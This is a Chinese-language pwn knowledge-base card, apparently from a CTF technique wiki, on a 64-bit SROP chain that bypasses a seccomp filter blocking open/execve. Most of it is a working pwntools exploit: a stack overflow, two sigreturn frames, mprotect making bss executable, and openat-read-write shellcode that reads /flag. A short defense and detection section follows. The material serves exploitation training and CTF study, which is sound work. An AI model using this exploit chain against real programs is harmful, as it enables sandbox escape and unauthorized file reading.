---
id: binary-pwn-stack-srop-mprotect-openat-shellcode-seccomp
title: seccomp 禁 open/execve 时的 64 位 SROP 链：mprotect 改 bss 为 RWX 后执行 openat ORW shellcode
type: scenario
domain: binary
path: binary/pwn/stack
technique: srop-mprotect-openat-shellcode-seccomp
tags:
- pwn
- srop
- sigreturn
- mprotect
- seccomp
- openat
- shellcode
- orw
- stack-overflow
- 64bit
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V203
  verified_at: '2026-11-07T02:17:07+08:00'
  notes: 已对照原文核对：seccomp KILL open/execve/execveat、两段 rt_sigreturn、read 返回 15 触发、mprotect(bss,0x1000,7)、openat(257) ORW shellcode、syscall;pop rbp;ret gadget，与原文 exp 一致。未验证点：未本机复跑；原文无受影响版本；frontmatter 无 sources/source_url。
url: /docs/binary/pwn/stack/binary-pwn-stack-srop-mprotect-openat-shellcode-seccomp/
draft: false
kb_aliases:
- 64 位 SROP 链
- read 返回 15 触发 rt_sigreturn
- SROP mprotect bss
- seccomp openat 绕过
- openat ORW shellcode
- syscall pop rbp ret gadget
- 两段 SROP
---

## 一句话结论

当 seccomp 只杀掉 `open(2)`、`execve(59)`、`execveat(322)` 而放行其他系统调用时，可用 64 位 SROP 在无寄存器 gadget 的情况下先 `read` 一段第二阶段到 bss、再 `mprotect(bss,0x1000,7)`，最后跳入写入 bss 的 shellcode，用 `openat(257)` 代替 `open` 完成 ORW 读取 flag。

## 原理

- **SROP 的作用**：64 位 Linux 的 `rt_sigreturn` 系统调用号是 15。内核会从当前 `rsp` 指向的 `sigcontext`/`SigreturnFrame`（248 字节）恢复 `rax/rdi/rsi/rdx/rsp/rip` 等全部寄存器。程序若没有 `pop rdi; pop rsi; ...` gadget，可用 SROP 直接设定任意寄存器和下一条指令。
- **如何把 rax 置为 15**：调用 `read(fd, buf, n)` 时返回实际读到的字节数并存放在 rax。安排一次 `read` 只读入 15 字节，返回后 rax=15，紧接着跳到 `syscall` 指令即触发 `rt_sigreturn`。
- **两段 SROP**：第一段 frame 设置 `rax=0`（read）、`rdi=0`、`rsi=bss`、`rdx=0x700`、`rsp=bss+offset`、`rip=syscall`，把第二阶段（shellcode + 第二个 frame）读入 bss；第二次 `read` 再读 15 字节把 rax 置回 15，触发第二段 frame。
- **第二段 frame**：设置 `rax=10`（mprotect）、`rdi=bss & ~0xfff`、`rsi=0x1000`、`rdx=7`、`rip=syscall`，把 bss 页改成 RWX；随后通过 `syscall; pop rbp; ret` 类 gadget 的 `ret` 跳到 bss 中的 shellcode。
- **为什么用 openat**：seccomp 过滤器只拦截 `open`，`openat(257)` 未被拦截。shellcode 用 `openat(AT_FDCWD=-100, "/flag", O_RDONLY)` 打开文件，再 `read`/`write` 输出。若 seccomp 用参数级过滤（只允许特定 syscall 号），需先 dump 过滤器确认可用系统调用。
- **为什么需要 `syscall; pop rbp; ret`**：每次 `syscall` 返回后需要继续从栈上取下一个目标地址；`syscall; ret` 只能弹一个返回地址，而 `syscall; pop rbp; ret` 提供了“跳过占位值 + 跳转”的组合，方便把 read_plt、frame、shellcode 地址串在一条栈上。
- **第一个小溢出**：部分题目先用只覆盖 saved rbp 的短溢出让后续 `leave; ret` 的栈基址落到 bss，给第二阶段提供可控栈区；该步骤不是必须，取决于程序的函数尾声结构。

## 触发条件

- Linux x86_64 ELF，存在可覆盖返回地址的栈溢出且能控制至少一段栈数据。
- 程序（或题目）安装了 seccomp 过滤器，禁用了 `open`/`execve`/`execveat`，但未禁用 `read`、`write`、`mprotect`、`openat`。
- 能找到 `syscall` 指令（以及可选的 `pop rbp`/`ret` 序列）；或已有 `read` 的 PLT 入口可反复调用。
- 目标 bss 地址固定（无 PIE 或已泄露 PIE），且可被 `mprotect` 改权限。
- 能发送二进制数据（socket/pipe），以便精确控制 `read` 返回长度。

## 利用步骤

1. 用 `checksec`/反汇编确认 NX、PIE、canary；用 `seccomp-tools dump` 或阅读过滤器确认禁用的系统调用号（重点：`open` 是否被禁、`openat` 是否可用）。
2. 定位栈溢出点、`read@plt`、`syscall` gadget（优先 `syscall; pop rbp; ret`）与 bss 地址。
3. 构造第一段 payload：填充到 saved rbp/返回地址，覆盖返回地址为 `read@plt`，随后放 `syscall_gadget` 与第一段 `SigreturnFrame`（read 到 bss、设置 rsp/rip）。
4. 程序执行第二次 read 时正好发送 15 字节，使 rax=15；`syscall` 触发 `rt_sigreturn`，按 frame1 把第二阶段读入 bss。
5. 第二阶段数据布局：bss 起始放 shellcode；在 frame1 指定的 `rsp` 位置放 `pop rbp` 占位值、`read@plt`、`syscall_gadget`、第二段 frame（mprotect）、跳转占位值、shellcode 地址。
6. 再次发送 15 字节触发第二次 `rt_sigreturn`；frame2 执行 `mprotect(bss,0x1000,7)`，返回后经 gadget 跳到 bss 的 shellcode。
7. shellcode 用 `openat(-100, "/flag", 0)` → `read` → `write(1, buf, n)` 输出；读取成功即完成。
8. 若没有可用的 `syscall; pop rbp; ret`，可用两段 frame 分别以 `rip` 指向 `syscall; ret`，并在每次 syscall 后把下一个地址放在 rsp 顶部，逐步推进。

## PoC

```python
from pwn import *

context(arch="amd64", os="linux", log_level="info")
elf = ELF("./pwn")
io = process("./pwn")

read_plt = elf.plt["read"]
syscall_pop = elf.symbols.get("syscall_pop_rbp_ret", 0x40140E)  # 需按实际 gadget 地址替换
bss = elf.bss() + 0x600

def frame(nr, rdi=0, rsi=0, rdx=0, rsp=0, rip=0):
    f = SigreturnFrame()
    f.rax, f.rdi, f.rsi, f.rdx, f.rsp, f.rip = nr, rdi, rsi, rdx, rsp, rip
    return bytes(f)

# 第一次溢出：覆盖返回地址，调用 read 再进入 syscall
payload  = b"A" * 0x68                    # 按实际偏移调整到 saved rip
payload += p64(read_plt)
payload += p64(syscall_pop)
payload += frame(0, rdi=0, rsi=bss, rdx=0x700, rsp=bss + 0x500, rip=syscall_pop)
io.send(payload)

# 第二次 read：只发 15 字节，使 rax=15 -> rt_sigreturn（frame1: 读 stage2 到 bss）
io.send(b"A" * 15)

# stage2：shellcode + 第二段 SROP（mprotect bss -> RWX）
sc = asm("""
    mov rax, 257          /* openat */
    mov rdi, -100         /* AT_FDCWD */
    lea rsi, [rip + path]
    xor rdx, rdx
    syscall
    mov rdi, rax
    lea rsi, [rip + buf]
    mov rdx, 0x100
    xor rax, rax          /* read */
    syscall
    mov rdi, 1
    lea rsi, [rip + buf]
    mov rdx, 0x100
    mov rax, 1            /* write */
    syscall
    mov rax, 60
    xor rdi, rdi
    syscall
path: .string "/flag"
buf:  .space 0x100
""")

stage2  = b"\x90" * 0x200 + sc
stage2  = stage2.ljust(0x500, b"\x90")
stage2 += p64(0xdead) + p64(read_plt) + p64(syscall_pop)
stage2 += frame(10, rdi=bss & ~0xfff, rsi=0x1000, rdx=7,
                rsp=bss + 0x610, rip=syscall_pop)
stage2 += p64(0xbeef) + p64(bss + 0x200)   # pop rbp 占位 + 跳 shellcode
io.send(stage2)

# 再发 15 字节，触发第二次 rt_sigreturn -> mprotect -> shellcode
io.send(b"A" * 15)
io.interactive()
```

```text
说明：偏移、gadget 地址、bss 偏移与 stage2 中 frame1.rsp 的位置需按题目二进制调整；
openat 的常量 -100 为 AT_FDCWD，若 seccomp 连 openat 也禁用，需换用其他未禁用调用（如 openat2）。
```

## 变体与关联

- 变体：seccomp 允许 `open` 但禁 `read` 时，可用 `mmap`+`sendfile` 或 `openat2` 等未被禁用的调用组合；先 dump 过滤器再选路径。
- 变体：无 `mprotect` 时可直接用 ROP 调 `openat/read/write`；SROP 只是无 gadget 时设定寄存器的替代方案。
- 变体：若 `rax` 无法通过 read 返回值控制，可用 `pop rax; ret`、`xor eax,eax` 或 `sigreturn` 之前的其他系统调用返回值构造 15。
- 变体：只有 32 位时使用 `int 0x80` 与 0x50 字节 frame，`__NR_sigreturn=0x77`，对应另一张 32 位 SROP 卡。
- 关联：[[binary-pwn-stack-32bit-srop-read-return-sigreturn]]（read 返回值触发 sigreturn 的基础）、[[binary-pwn-stack-ret2shellcode-mprotect-bss-rwx-page]]（mprotect bss 后执行 shellcode）、[[binary-pwn-stack-fake-rbp-check-seccomp-orw]]（seccomp 下 ORW 的另一种 ROP 组织）。

## 检测与防御

- 防御：seccomp 采用白名单并覆盖 `mprotect`/`openat`/`read`/`write` 等组合；对危险系统调用做参数级过滤（如只允许打开特定路径），不要只禁 `open`。
- 防御：bss/数据页保持 NX；避免把可控缓冲区放在可被 `mprotect` 影响的可执行区域；启用 PIE/ASLR 并保护 bss 地址。
- 防御：栈溢出防护（canary、FORTIFY、CET/Shadow Stack）提高 SROP 前置条件成本。
- 检测：进程在崩溃前出现 `rt_sigreturn`、`mprotect(PROT_EXEC)`、`openat` 的组合；审计 seccomp 日志中异常的系统调用序列。
